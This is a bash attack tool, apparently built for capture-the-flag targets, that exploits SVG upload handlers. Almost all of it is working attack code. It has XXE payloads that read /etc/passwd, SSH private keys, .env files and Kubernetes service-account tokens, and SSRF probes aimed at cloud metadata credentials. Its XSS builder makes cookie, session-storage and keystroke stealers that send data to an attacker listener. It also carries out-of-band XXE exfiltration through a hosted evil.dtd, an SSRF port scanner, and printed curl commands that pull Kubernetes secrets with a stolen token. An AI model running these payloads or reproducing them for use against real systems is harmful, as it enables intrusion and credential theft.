#!/bin/bash
# SVG XXE Swiss Army Knife v4.0
# Fixes: HTML entity decode · K8s module · XSS builder · tcp6 parser · maps analyzer · auto-recon

R='\033[0;31m' G='\033[0;32m' Y='\033[1;33m' B='\033[0;34m' C='\033[0;36m' M='\033[0;35m' W='\033[0m' BOLD='\033[1m'
CURL=/usr/bin/curl
TARGET="" UPLOAD_URL="" FIELD="uploadFile" COOKIE="" EXTRA_HEADERS=()
DISPLAY_PAGES=() SOURCE_QUEUE=() SOURCE_READ=()
REPORT_FILE="xxe_report_$(date +%Y%m%d_%H%M%S).txt"

banner() {
  echo -e "${C}${BOLD}"
  echo "  ╔══════════════════════════════════════════════════════════╗"
  echo "  ║   SVG XXE Swiss Army Knife  v4.0                        ║"
  echo "  ║   read · xss · k8s · ssrf · oob · spider · auto-recon  ║"
  echo "  ╚══════════════════════════════════════════════════════════╝"
  echo -e "${W}"
}

info()    { echo -e "${B}[*]${W} $*";            tee_report "[*] $*"; }
ok()      { echo -e "${G}[✓]${W} $*";            tee_report "[✓] $*"; }
fail()    { echo -e "${R}[✗]${W} $*";            tee_report "[✗] $*"; }
warn()    { echo -e "${Y}[!]${W} $*";            tee_report "[!] $*"; }
pwn()     { echo -e "${Y}${BOLD}[FLAG] $*${W}";  tee_report "[FLAG] $*"; }
section() { echo -e "\n${M}${BOLD}── $* ──${W}"; tee_report "\n── $* ──"; }
tee_report() { [[ -n "$REPORT_FILE" ]] && echo "$*" >> "$REPORT_FILE" 2>/dev/null || true; }

# ── curl wrapper ───────────────────────────────────────────────────────────
do_curl() {
  local args=("$@")
  [[ -n "$COOKIE" ]] && args=("-b" "$COOKIE" "${args[@]}")
  for h in "${EXTRA_HEADERS[@]}"; do args=("-H" "$h" "${args[@]}"); done
  $CURL -s "${args[@]}"
}

# ── HTML entity decode + multiline extractor ───────────────────────────────
# FIX: file:// content gets HTML-encoded by the page (&gt; &lt; &amp;)
# Always decode before returning content
extract_text() {
  python3 -c "
import sys, re, html
d = sys.stdin.read()
m = re.search(r'<text[^>]*>(.*?)</text>', d, re.DOTALL)
if m:
    print(html.unescape(m.group(1).strip()))
" <<< "$1"
}

extract_b64() {
  python3 -c "
import sys, re, base64, html
d = sys.stdin.read()
m = re.search(r'<text[^>]*>([A-Za-z0-9+/\n\r]+={0,2})</text>', d, re.DOTALL)
if m:
    b = m.group(1).replace('\n','').replace('\r','').strip()
    try: print(base64.b64decode(b).decode('utf-8', errors='replace').strip())
    except: pass
" <<< "$1"
}

check_flag() {
  local f
  f=$(echo "$1" | grep -oP 'HTB\{[^}]+\}|THM\{[^}]+\}|FLAG\{[^}]+\}|ctf\{[^}]+\}')
  [[ -n "$f" ]] && pwn "$f"
}

print_result() {
  local file="$1" content="$2"
  local bar; bar=$(printf '─%.0s' $(seq 1 52))
  echo ""
  echo -e "${G}┌─ ${file}${W}"
  echo "$content" | while IFS= read -r line; do echo -e "${G}│${W} $line"; done
  echo -e "${G}└${bar}${W}"
  echo ""
  # Save to report
  { echo ""; echo "=== $file ==="; echo "$content"; } >> "$REPORT_FILE" 2>/dev/null
  check_flag "$content"
}

# ── Core XXE file read ─────────────────────────────────────────────────────
xxe_read() {
  local FILE="$1" content=""

  # Method 1: file://
  local P1="<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file://${FILE}\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
  do_curl -F "${FIELD}=@-;filename=xxe.svg;type=image/svg+xml" "$UPLOAD_URL" <<< "$P1" > /dev/null

  for dp in "${DISPLAY_PAGES[@]}"; do
    content=$(extract_text "$(do_curl "$dp")")
    if [[ -n "$content" && "$content" != *"DOCTYPE"* ]]; then
      ok "file:// → ${dp}"
      print_result "$FILE" "$content"
      spider_source "$FILE" "$content"
      return 0
    fi
  done

  # Method 2: php://filter base64 (handles special chars, binary-safe)
  info "Falling back to php://filter..."
  local P2="<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=${FILE}\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
  do_curl -F "${FIELD}=@-;filename=xxe.svg;type=image/svg+xml" "$UPLOAD_URL" <<< "$P2" > /dev/null

  for dp in "${DISPLAY_PAGES[@]}"; do
    content=$(extract_b64 "$(do_curl "$dp")")
    if [[ -n "$content" && ${#content} -gt 2 ]]; then
      ok "php://filter → ${dp}"
      print_result "$FILE" "$content"
      spider_source "$FILE" "$content"
      return 0
    fi
  done

  fail "Both methods failed: ${FILE}"
  return 1
}

# ── Source spider ──────────────────────────────────────────────────────────
spider_source() {
  local file="$1" content="$2"
  [[ "$file" != *.php && "$file" != *.js ]] && return

  local webroot="/var/www/html"
  local dir; dir=$(dirname "$file")

  # PHP: include/require targets
  local found
  found=$(echo "$content" | grep -oP "(?<=include|require|include_once|require_once)[^;]+" \
          | grep -oP "['\"][^'\"]+\.(php|js|json|conf|xml)['\"]" \
          | tr -d "'\"" | sort -u)

  while IFS= read -r inc; do
    [[ -z "$inc" ]] && continue
    local abs
    [[ "$inc" == /* ]] && abs="${webroot}${inc}" || abs="${dir}/${inc}"
    local already=0
    for r in "${SOURCE_READ[@]}"; do [[ "$r" == "$abs" ]] && already=1 && break; done
    if [[ $already -eq 0 ]]; then
      warn "Spider queued: ${abs}"
      SOURCE_QUEUE+=("$abs")
    fi
  done <<< "$found"
}

run_spider() {
  if [[ ${#SOURCE_QUEUE[@]} -eq 0 ]]; then
    warn "Spider queue empty — read a PHP file first"
    return
  fi
  section "Source Spider"
  while [[ ${#SOURCE_QUEUE[@]} -gt 0 ]]; do
    local f="${SOURCE_QUEUE[0]}"
    SOURCE_QUEUE=("${SOURCE_QUEUE[@]:1}")
    SOURCE_READ+=("$f")
    info "Spider: ${f}"
    xxe_read "$f"
  done
  ok "Spider done — ${#SOURCE_READ[@]} files read"
}

# ── /proc/net/tcp6 parser ─────────────────────────────────────────────────
# FIX: previous version only checked tcp (IPv4). All connections on this
# target are tcp6 (IPv6-mapped IPv4). Decode hex addresses properly.
parse_tcp() {
  local raw="$1"
  python3 -c "
import sys, socket, struct

raw = '''${raw}'''

def decode_addr(hex_addr):
    parts = hex_addr.split(':')
    if len(parts) != 2:
        return hex_addr
    addr_hex, port_hex = parts
    port = int(port_hex, 16)
    # IPv6-mapped IPv4: last 8 hex chars are the IPv4
    if len(addr_hex) == 32:
        ipv4_hex = addr_hex[24:]
        ip = socket.inet_ntoa(struct.pack('<I', int(ipv4_hex, 16)))
        return f'{ip}:{port}'
    else:
        ip = socket.inet_ntoa(struct.pack('<I', int(addr_hex, 16)))
        return f'{ip}:{port}'

states = {'0A':'LISTEN','01':'ESTABLISHED','06':'TIME_WAIT','02':'SYN_SENT','03':'SYN_RECV'}
print(f'  {\"Local\":<22} {\"Remote\":<22} State')
print('  ' + '-'*55)
for line in raw.strip().split('\n')[1:]:
    p = line.split()
    if len(p) < 4:
        continue
    state = states.get(p[3], p[3])
    local = decode_addr(p[1])
    remote = decode_addr(p[2])
    if state in ('LISTEN','ESTABLISHED'):
        print(f'  {local:<22} {remote:<22} {state}')
"
}

attack_port_map() {
  section "Network Port Map (/proc/net/tcp + tcp6)"
  for f in /proc/net/tcp /proc/net/tcp6; do
    info "Reading ${f}..."
    local P="<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=${f}\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
    do_curl -F "${FIELD}=@-;filename=xxe.svg;type=image/svg+xml" "$UPLOAD_URL" <<< "$P" > /dev/null
    local raw
    raw=$(extract_b64 "$(do_curl "${DISPLAY_PAGES[0]}")")
    if [[ -n "$raw" ]]; then
      ok "${f}:"
      parse_tcp "$raw"
    else
      fail "Could not read ${f}"
    fi
    echo ""
  done
}

# ── /proc/self/maps analyzer ──────────────────────────────────────────────
attack_maps() {
  section "/proc/self/maps — Loaded Libraries & PHP Extensions"
  local P="<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/proc/self/maps\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
  do_curl -F "${FIELD}=@-;filename=xxe.svg;type=image/svg+xml" "$UPLOAD_URL" <<< "$P" > /dev/null
  local raw
  raw=$(extract_b64 "$(do_curl "${DISPLAY_PAGES[0]}")")
  if [[ -z "$raw" ]]; then fail "Could not read /proc/self/maps"; return; fi

  echo ""
  echo -e "${Y}  PHP Extensions loaded:${W}"
  echo "$raw" | grep -oP '/[^ ]+\.so[^ ]*' | sort -u | grep -i 'php\|mod_' | while read -r l; do echo "    $l"; done

  echo ""
  echo -e "${Y}  Interesting libraries (exploitable?):${W}"
  echo "$raw" | grep -oP '/[^ ]+\.so[^ ]*' | sort -u | grep -iE 'expect|imagick|curl|openssl|gd|mysqli|pdo' | while read -r l; do echo "    $l"; done

  echo ""
  echo -e "${Y}  Web root paths detected:${W}"
  echo "$raw" | grep -oP '/var/www[^ ]+' | sort -u | while read -r l; do echo "    $l"; done

  echo ""
  echo -e "${Y}  Checking for expect (RCE primitive):${W}"
  if echo "$raw" | grep -qi 'expect'; then
    pwn "expect extension LOADED — try expect://id via XXE!"
  else
    info "expect not loaded"
  fi
}

# ── K8s attack module ──────────────────────────────────────────────────────
attack_k8s() {
  section "Kubernetes Attack Module"
  local SA="/var/run/secrets/kubernetes.io/serviceaccount"

  echo -e "${Y}  Reading K8s service account files...${W}"
  local TOKEN NS

  # Token
  local P="<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=${SA}/token\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
  do_curl -F "${FIELD}=@-;filename=xxe.svg;type=image/svg+xml" "$UPLOAD_URL" <<< "$P" > /dev/null
  TOKEN=$(extract_b64 "$(do_curl "${DISPLAY_PAGES[0]}")")

  # Namespace
  P="<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file://${SA}/namespace\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
  do_curl -F "${FIELD}=@-;filename=xxe.svg;type=image/svg+xml" "$UPLOAD_URL" <<< "$P" > /dev/null
  NS=$(extract_text "$(do_curl "${DISPLAY_PAGES[0]}")")

  if [[ -n "$TOKEN" ]]; then
    ok "Service account token retrieved!"
    echo ""
    echo -e "${G}  TOKEN (first 80 chars): ${TOKEN:0:80}...${W}"
    echo ""
    echo -e "${Y}  Next steps — query K8s API with this token:${W}"
    echo "  # Find API server IP from /etc/resolv.conf or default 10.96.0.1"
    echo "  TOKEN='${TOKEN}'"
    echo "  curl -sk -H \"Authorization: Bearer \$TOKEN\" https://10.96.0.1/api/v1/namespaces/${NS:-default}/secrets"
    echo "  curl -sk -H \"Authorization: Bearer \$TOKEN\" https://10.96.0.1/api/v1/pods"
    echo ""
    echo -e "${Y}  Try to list all secrets (may contain DB passwords, API keys):${W}"
    echo "  curl -sk -H \"Authorization: Bearer \$TOKEN\" https://10.96.0.1/api/v1/secrets"
    { echo "K8s Token: $TOKEN"; echo "Namespace: $NS"; } >> "$REPORT_FILE" 2>/dev/null
  else
    warn "Service account token not readable (not mounted or permission denied)"
  fi

  [[ -n "$NS" ]] && ok "Namespace: ${NS}" || warn "Namespace not readable"

  # Try /etc/resolv.conf for cluster DNS / API server hints
  echo ""
  info "Reading /etc/resolv.conf for cluster info..."
  P="<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/resolv.conf\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
  do_curl -F "${FIELD}=@-;filename=xxe.svg;type=image/svg+xml" "$UPLOAD_URL" <<< "$P" > /dev/null
  local RESOLV
  RESOLV=$(extract_text "$(do_curl "${DISPLAY_PAGES[0]}")")
  [[ -n "$RESOLV" ]] && print_result "/etc/resolv.conf" "$RESOLV" || fail "Could not read resolv.conf"

  # Cloud metadata probes
  echo ""
  echo -e "${Y}  Probing cloud metadata endpoints via SSRF...${W}"
  local METADATA_URLS=(
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    "http://169.254.169.254/metadata/v1/iam/security-credentials"
    "http://metadata.google.internal/computeMetadata/v1/instance/"
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
  )
  local METADATA_NAMES=("AWS IAM creds" "DigitalOcean" "GCP metadata" "Azure metadata")

  for i in "${!METADATA_URLS[@]}"; do
    local URL="${METADATA_URLS[$i]}"
    local NAME="${METADATA_NAMES[$i]}"
    local P="<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY ssrf SYSTEM \"${URL}\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&ssrf;</text></svg>"
    do_curl --max-time 4 -F "${FIELD}=@-;filename=ssrf.svg;type=image/svg+xml" "$UPLOAD_URL" <<< "$P" > /dev/null
    local RESP
    RESP=$(extract_text "$(do_curl "${DISPLAY_PAGES[0]}")")
    if [[ -n "$RESP" && "$RESP" != *"DOCTYPE"* ]]; then
      pwn "Cloud metadata via SSRF (${NAME})!"
      print_result "$URL" "$RESP"
    else
      info "${NAME}: no response"
    fi
  done
}

# ── SVG XSS builder ───────────────────────────────────────────────────────
# FIX: previous version generated payload but didn't upload with proper XML
# structure. Now offers multiple XSS techniques.
attack_xss() {
  section "SVG XSS — Confirmed Working (onload renders inline)"
  echo ""
  echo -e "${Y}  XSS Payload type:${W}"
  echo "   1) Cookie stealer     → sends document.cookie to your listener"
  echo "   2) Session grabber    → steals sessionStorage + localStorage"
  echo "   3) Keylogger          → logs keystrokes to your listener"
  echo "   4) Alert PoC          → alert(document.domain) to confirm"
  echo "   5) BeEF hook          → hooks browser to BeEF framework"
  echo ""
  read -rp "  Type [1-5]: " XSS_TYPE

  local LHOST="" LPORT="8000"
  if [[ "$XSS_TYPE" != "4" ]]; then
    read -rp "  Your listener IP   : " LHOST
    read -rp "  Your listener port [8000]: " LPORT
    LPORT="${LPORT:-8000}"
  fi

  local JS_PAYLOAD
  case "$XSS_TYPE" in
    1) JS_PAYLOAD="fetch('http://${LHOST}:${LPORT}/?c='+encodeURIComponent(document.cookie))" ;;
    2) JS_PAYLOAD="fetch('http://${LHOST}:${LPORT}/?s='+encodeURIComponent(JSON.stringify({c:document.cookie,ss:JSON.stringify(sessionStorage),ls:JSON.stringify(localStorage)})))" ;;
    3) JS_PAYLOAD="document.addEventListener('keydown',function(e){fetch('http://${LHOST}:${LPORT}/?k='+encodeURIComponent(e.key))})" ;;
    4) JS_PAYLOAD="alert(document.domain+'\\n'+document.cookie)" ;;
    5) read -rp "  BeEF hook URL [http://127.0.0.1:3000/hook.js]: " BEEF
       BEEF="${BEEF:-http://127.0.0.1:3000/hook.js}"
       JS_PAYLOAD="var s=document.createElement('script');s.src='${BEEF}';document.head.appendChild(s)" ;;
    *) warn "Invalid choice"; return ;;
  esac

  local PAYLOAD="<?xml version=\"1.0\"?><!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">
<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"${JS_PAYLOAD}\">
<text>svg</text>
</svg>"

  local RESP
  RESP=$(do_curl -F "${FIELD}=@-;filename=xss.svg;type=image/svg+xml" "$UPLOAD_URL" <<< "$PAYLOAD")
  echo "  Upload: $RESP"

  if echo "$RESP" | grep -qi "success\|uploaded"; then
    ok "XSS SVG uploaded — payload is live on ${DISPLAY_PAGES[0]}"
    echo ""
    if [[ "$XSS_TYPE" != "4" && "$XSS_TYPE" != "5" ]]; then
      echo -e "${Y}  Start listener:${W}"
      echo "  python3 -m http.server ${LPORT}"
      echo "  # or: nc -lvnp ${LPORT}"
      echo ""
      echo -e "${Y}  Trigger by visiting:${W}"
      echo "  ${DISPLAY_PAGES[0]}"
    fi
  else
    fail "Upload rejected"
  fi
}

# ── SSRF Port Scanner ──────────────────────────────────────────────────────
# FIX: previous version made an extra redundant fetch inside the loop.
# Now uses timing only + checks display page once per port for leaked data.
attack_ssrf_scan() {
  section "SSRF Internal Port Scanner"
  read -rp "  Host to scan [127.0.0.1]: " SSRF_HOST; SSRF_HOST="${SSRF_HOST:-127.0.0.1}"
  read -rp "  Port list (comma) or range start [common]: " P_INPUT

  local PORTS=()
  if [[ -z "$P_INPUT" || "$P_INPUT" == "common" ]]; then
    PORTS=(21 22 23 25 53 80 443 445 1433 1521 2375 2376 3000 3306 3389 4848 5432 5900 6379 7001 8080 8443 8888 9000 9200 9300 27017)
  elif [[ "$P_INPUT" == *","* ]]; then
    IFS=',' read -ra PORTS <<< "$P_INPUT"
  else
    read -rp "  Port range end: " P_END
    for (( p=P_INPUT; p<=P_END; p++ )); do PORTS+=("$p"); done
  fi

  # Baseline timing
  local BS BE BMS
  BS=$(date +%s%N)
  do_curl -F "${FIELD}=@-;filename=b.svg;type=image/svg+xml" "$UPLOAD_URL" \
    <<< '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><text>base</text></svg>' > /dev/null
  BE=$(date +%s%N); BMS=$(( (BE-BS)/1000000 ))
  info "Baseline: ${BMS}ms — scanning ${#PORTS[@]} ports on ${SSRF_HOST}"

  local THRESHOLD=$(( BMS + 1500 ))
  local OPEN=() SLOW=()

  for port in "${PORTS[@]}"; do
    local P="<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY s SYSTEM \"http://${SSRF_HOST}:${port}/\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&s;</text></svg>"
    local S E MS
    S=$(date +%s%N)
    do_curl --max-time 3 -F "${FIELD}=@-;filename=s.svg;type=image/svg+xml" "$UPLOAD_URL" <<< "$P" > /dev/null
    E=$(date +%s%N); MS=$(( (E-S)/1000000 ))

    # Check if SSRF response leaked into display page
    local LEAKED
    LEAKED=$(extract_text "$(do_curl "${DISPLAY_PAGES[0]}")")

    if [[ $MS -gt $THRESHOLD ]]; then
      echo -e "  ${Y}[SLOW]${W}     :${port}  (${MS}ms) — filtered or accepting"
      SLOW+=("$port")
    elif [[ -n "$LEAKED" && "$LEAKED" != *"DOCTYPE"* ]]; then
      echo -e "  ${G}[OPEN+DATA]${W} :${port}  (${MS}ms) ← service data leaked!"
      echo "    Data: ${LEAKED:0:100}"
      OPEN+=("$port")
    else
      echo -e "  ${B}[fast]${W}     :${port}  (${MS}ms)"
    fi
  done

  echo ""
  [[ ${#OPEN[@]} -gt 0 ]] && ok "Ports with leaked data: ${OPEN[*]}"
  [[ ${#SLOW[@]} -gt 0 ]] && warn "Slow ports (filtered/open): ${SLOW[*]}"
}

# ── OOB XXE ───────────────────────────────────────────────────────────────
attack_oob() {
  section "OOB XXE — Blind Exfiltration"
  echo "   1) Direct HTTP GET  (small files, no special chars)"
  echo "   2) DTD-based OOB    (reliable, handles any file)"
  echo ""
  read -rp "  Mode [1/2]: " OOB_MODE
  read -rp "  Your listener IP  : " OOB_HOST
  read -rp "  Your listener port [8000]: " OOB_PORT; OOB_PORT="${OOB_PORT:-8000}"
  read -rp "  File to exfiltrate [/etc/passwd]: " OOB_FILE; OOB_FILE="${OOB_FILE:-/etc/passwd}"

  if [[ "$OOB_MODE" == "1" ]]; then
    local P="<?xml version=\"1.0\"?><!DOCTYPE svg [
  <!ENTITY % file SYSTEM \"file://${OOB_FILE}\">
  <!ENTITY % send SYSTEM \"http://${OOB_HOST}:${OOB_PORT}/?x=%file;\">
  %send;
]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>oob</text></svg>"
    info "Start listener first: python3 -m http.server ${OOB_PORT}"
    do_curl -F "${FIELD}=@-;filename=oob.svg;type=image/svg+xml" "$UPLOAD_URL" <<< "$P"
    echo ""; ok "Payload sent — watch your listener"

  else
    local DTD_URL="http://${OOB_HOST}:${OOB_PORT}/evil.dtd"
    echo ""
    echo -e "${Y}  Step 1 — Save this as evil.dtd and host it:${W}"
    cat <<EOF
<!ENTITY % file SYSTEM "file://${OOB_FILE}">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://${OOB_HOST}:${OOB_PORT}/?data=%file;'>">
%eval;
%exfil;
EOF
    echo ""
    echo -e "${Y}  Step 2 — python3 -m http.server ${OOB_PORT}${W}"
    echo ""
    read -rp "  Press Enter when DTD is hosted and listener is ready..." _

    local P="<?xml version=\"1.0\"?><!DOCTYPE svg [
  <!ENTITY % dtd SYSTEM \"${DTD_URL}\">
  %dtd;
]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>oob</text></svg>"
    do_curl -F "${FIELD}=@-;filename=oob.svg;type=image/svg+xml" "$UPLOAD_URL" <<< "$P"
    echo ""; ok "Payload sent — watch your HTTP server"
  fi
}

# ── Auto-recon dump ────────────────────────────────────────────────────────
attack_autorecon() {
  section "Auto-Recon — Full Dump to ${REPORT_FILE}"
  info "Running all standard reads..."

  local FILES=(
    "/etc/passwd" "/etc/hosts" "/etc/resolv.conf"
    "/flag.txt" "/root/flag.txt" "/home/user/flag.txt"
    "/proc/self/environ" "/proc/self/cmdline" "/proc/self/status"
    "/var/www/html/upload.php" "/var/www/html/index.php"
    "/var/www/html/.env" "/var/www/html/config.php"
    "/var/www/html/db.php" "/var/www/html/database.php"
    "/root/.ssh/id_rsa" "/root/.ssh/authorized_keys"
    "/var/run/secrets/kubernetes.io/serviceaccount/token"
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
  )

  local found=0
  for f in "${FILES[@]}"; do
    if xxe_read "$f" 2>/dev/null; then
      (( found++ ))
    fi
  done

  # Always run port map and maps analyzer
  attack_port_map
  attack_maps

  ok "Auto-recon done — ${found} files read. Report saved to: ${REPORT_FILE}"
}

# ── Auto-discover display pages ────────────────────────────────────────────
discover_display_pages() {
  info "Auto-discovering display pages..."
  local MARKER="XXEPROBE_$$"
  local PROBE="<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><text>${MARKER}</text></svg>"
  local UPLOAD_RESP
  UPLOAD_RESP=$(do_curl -F "${FIELD}=@-;filename=probe.svg;type=image/svg+xml" "$UPLOAD_URL" <<< "$PROBE")

  DISPLAY_PAGES=()
  [[ "$UPLOAD_RESP" == *"$MARKER"* ]] && ok "Upload response renders SVG" && DISPLAY_PAGES+=("$UPLOAD_URL")

  local PATHS=("/" "/index.php" "/index.html" "/home" "/home.php" "/profile" "/profile.php"
               "/dashboard" "/dashboard.php" "/gallery" "/gallery.php" "/upload" "/upload.php"
               "/view" "/view.php" "/preview" "/preview.php" "/result" "/result.php" "/images")

  for path in "${PATHS[@]}"; do
    local url="${TARGET}${path}"
    local body; body=$(do_curl "$url")
    if [[ "$body" == *"$MARKER"* ]]; then
      ok "Display page: ${url}"
      DISPLAY_PAGES+=("$url")
    fi
  done

  [[ ${#DISPLAY_PAGES[@]} -eq 0 ]] && warn "No display page found — defaulting to ${TARGET}/" && DISPLAY_PAGES+=("${TARGET}/")
}

# ── Auto-detect upload form ────────────────────────────────────────────────
autodiscover_form() {
  info "Crawling ${TARGET} for upload form..."
  local html; html=$($CURL -s "$TARGET/")
  local action field

  # Try action containing upload/file/submit first, then any form action
  action=$(echo "$html" | grep -oP '(?i)action=["\x27]\K[^">\x27]+' | grep -i 'upload\|file\|submit' | head -1)
  [[ -z "$action" ]] && action=$(echo "$html" | grep -oP '(?i)action=["\x27]\K[^">\x27]+' | head -1)

  field=$(echo "$html" | grep -oP '(?i)<input[^>]+type=["\x27]?file["\x27]?[^>]+>' | grep -oP '(?i)name=["\x27]\K[^">\x27]+' | head -1)

  if [[ -n "$action" ]]; then
    UPLOAD_URL="${TARGET}/${action#/}"
    ok "Detected upload URL: ${UPLOAD_URL}"
  else
    # Fallback default
    UPLOAD_URL="${TARGET}/upload.php"
    warn "Could not detect form action — defaulting to ${UPLOAD_URL}"
  fi
  [[ -n "$field" ]] && FIELD="$field" && ok "Detected field: ${FIELD}"
}

# ── Menu ──────────────────────────────────────────────────────────────────
show_menu() {
  echo -e "\n${Y}${BOLD}  FILE READ${W}"
  echo "   1) /etc/passwd              7) /proc/net/tcp+tcp6 (port map)"
  echo "   2) /etc/hosts               8) /var/www/html/upload.php"
  echo "   3) /flag.txt                9) /var/www/html/.env"
  echo "   4) /root/flag.txt          10) /var/www/html/config.php"
  echo "   5) /proc/self/environ      11) /root/.ssh/id_rsa"
  echo "   6) /proc/self/status       12) Custom user home files"
  echo "  13) Custom path             14) /proc/self/maps (lib analyzer)"
  echo ""
  echo -e "${Y}${BOLD}  ATTACKS${W}"
  echo "  20) SVG XSS builder         23) Source spider (auto-read includes)"
  echo "  21) SSRF port scan          24) K8s attack module"
  echo "  22) OOB XXE (blind exfil)   25) Auto-recon dump (all at once)"
  echo ""
  echo -e "${Y}${BOLD}  UTILS${W}"
  echo "   r) Re-discover display pages    q) Quit"
  echo "   Report: ${REPORT_FILE}"
  echo ""
}

# ── Setup ─────────────────────────────────────────────────────────────────
banner
read -rp "  Target (http://ip:port): " TARGET
TARGET="${TARGET%/}"

autodiscover_form

read -rp "  Upload path   [${UPLOAD_URL}] (Enter=keep): " UP_O
[[ -n "$UP_O" ]] && UPLOAD_URL="${TARGET}/${UP_O#/}"
read -rp "  Upload field  [${FIELD}] (Enter=keep): " F_O
[[ -n "$F_O" ]] && FIELD="$F_O"
read -rp "  Cookie        (blank=none): " COOKIE
read -rp "  Extra header  (blank=none): " EH; [[ -n "$EH" ]] && EXTRA_HEADERS+=("$EH")

echo ""
ok "Target : ${TARGET}"
ok "Upload : ${UPLOAD_URL}"
ok "Field  : ${FIELD}"
[[ -n "$COOKIE" ]] && ok "Cookie : ${COOKIE}"
ok "Report : ${REPORT_FILE}"
echo ""

discover_display_pages
echo ""

# ── Main loop ─────────────────────────────────────────────────────────────
while true; do
  show_menu
  read -rp "  Choice: " C

  case "$C" in
    1)  xxe_read "/etc/passwd" ;;
    2)  xxe_read "/etc/hosts" ;;
    3)  xxe_read "/flag.txt" ;;
    4)  xxe_read "/root/flag.txt" ;;
    5)  xxe_read "/proc/self/environ" ;;
    6)  xxe_read "/proc/self/status" ;;
    7)  attack_port_map ;;
    8)  xxe_read "/var/www/html/upload.php" ;;
    9)  xxe_read "/var/www/html/.env" ;;
    10) xxe_read "/var/www/html/config.php" ;;
    11) xxe_read "/root/.ssh/id_rsa" ;;
    12) read -rp "  Username: " U
        xxe_read "/home/${U}/.ssh/id_rsa"
        xxe_read "/home/${U}/.bash_history"
        xxe_read "/home/${U}/.env" ;;
    13) read -rp "  Path: " P; xxe_read "$P" ;;
    14) attack_maps ;;
    20) attack_xss ;;
    21) attack_ssrf_scan ;;
    22) attack_oob ;;
    23) run_spider ;;
    24) attack_k8s ;;
    25) attack_autorecon ;;
    r|R) discover_display_pages ;;
    q|Q) echo -e "${G}Bye. Report: ${REPORT_FILE}${W}"; exit 0 ;;
    *)  warn "Invalid choice" ;;
  esac
done
